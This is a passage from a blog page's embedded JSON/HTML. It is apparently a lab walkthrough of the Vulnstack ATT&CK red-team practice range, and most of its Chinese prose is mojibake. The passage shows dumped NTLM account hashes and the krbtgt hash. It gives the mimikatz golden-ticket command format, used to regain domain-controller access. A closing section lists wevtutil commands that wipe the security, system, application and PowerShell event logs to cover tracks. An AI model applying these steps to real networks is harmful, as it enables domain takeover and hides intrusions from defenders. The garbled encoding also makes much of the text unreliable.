class=\"hljs-number\">1001</span>:aad3b435b51404eeaad3b435b51404ee:35c29a27ff5086ba975d49493673eddb:::\nROOT-TVI862UBEH$:<span class=\"hljs-number\">1104</span>:aad3b435b51404eeaad3b435b51404ee:c1e8fa40153fef225ce4f3d627181bcf:::\nSTU1$:<span class=\"hljs-number\">1105</span>:aad3b435b51404eeaad3b435b51404ee:75c2c82fa50b7716428d85372374b139:::\nDEV1$:<span class=\"hljs-number\">1107</span>:aad3b435b51404eeaad3b435b51404ee:bed18e5b9d13bb384a3041a10d43c01b:::\n</code></pre>\n<p><code>KRBTGT</code> çš„<code>NTLM</code>çš„<code>HASH</code> æ˜¯<code>58e91a5ac358d86513ab224312314061</code> ï¼Œæ”¶é›†å®Œè¿™äº›ä¿¡æ¯åé‡‘ç¥¨ç¥¨æ®å°±å¯ä»¥åˆ¶ä½œäº†</p>\n</li>\n<li>\n<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·<code>test</code> ï¼Œé»˜è®¤æ²¡æœ‰ç®¡ç†å‘˜æƒé™ï¼Œ</p>\n</li>\n<li>\n<p>å‡å¦‚ç°åœ¨åŸŸç®¡ç†å‘˜è´¦æˆ·è¢«æ”¹äº†ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯†ç ï¼Œåªèƒ½ç™»é™†<code>test</code>ç”¨æˆ·</p>\n</li>\n<li>\n<p>ç™»å½•testç”¨æˆ·ï¼Œæµ‹è¯•æƒé™</p>\n<p>é€šè¿‡ç½‘ç»œè®¿é—®åŸŸæ§æ–‡ä»¶åƒæ˜¯<code>access is denied</code> æ— æƒé™</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image15.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>åˆ¶ä½œé»„é‡‘ç¥¨æ®,å°†<code>mimikatz</code>æ‹¿åˆ°å®¢æˆ·æœº</p>\n<p>æ ¼å¼ï¼škerberos::golden /user:XXXä»»æ„ç”¨æˆ·å /domain:åŸŸå /sid:åŸŸçš„sidå€¼ /ticket:XXX.kirbi(ç”Ÿæˆçš„ç¥¨æ®åç§°)</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image16.png\" alt=\"image.png\"></p>\n<p>ç”ŸæˆæˆåŠŸ</p>\n</li>\n<li>\n<p>ä½¿ç”¨<code>klist</code>æŸ¥çœ‹ç”Ÿæˆçš„ç¥¨æ®</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image17.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>å†é€šè¿‡ç½‘ç»œè®¿é—®åŸŸæ§æ–‡ä»¶ï¼ŒæˆåŠŸè·å–</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image18.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>è¿™æ ·å°±å¯ä»¥é‡æ–°è·å¾—åŸŸçš„ç®¡ç†æƒï¼Œå‰ææ˜¯<code>krbtgt</code> è´¦æˆ·çš„å¯†ç æ²¡æœ‰è¢«ä¿®æ”¹</p>\n</li>\n</ol>\n<h2>ç—•è¿¹æ¸…ç†</h2>\n<pre><code class=\"hljs language-python\">shell wevtutil cl security    //æ¸…ç†å®‰å…¨æ—¥å¿—\nshell wevtutil cl system        //æ¸…ç†ç³»ç»Ÿæ—¥å¿—\nshell wevtutil cl application        //æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—\nshell wevtutil cl <span class=\"hljs-string\">\"windows powershell\"</span>    //æ¸…é™¤power shellæ—¥å¿—\nshell wevtutil cl Setup     //æ¸…é™¤ï¼ˆclï¼‰äº‹ä»¶æ—¥å¿—ä¸­çš„ <span class=\"hljs-string\">\"Setup\"</span> äº‹ä»¶ã€‚\n</code></pre>","title":"Vulnstack - ATT&CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸€)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windowsé¶æœº","ç»¼åˆé¶åœº"],"categories":"é¶æœº","description":"ATT&CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸€) http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ /image.png) é¶åœºæ­å»º é¶æœºé€šç”¨å¯†ç ï¼šhongrisec@2019 ipç½‘ç»œè®¾ç½® åˆ›å»ºä¸€ä¸ªä»…ä¸»æœºçš„è™šæ‹Ÿç½‘å¡ï¼Œç½‘æ®µæ˜¯192.168.52.0 ï¼Œnatç½‘å¡éš..."},"recentPosts":[{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"å¿µå¿µç¢","title":"å¿µå¿µç¢","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"}]},"__N_SSG":true}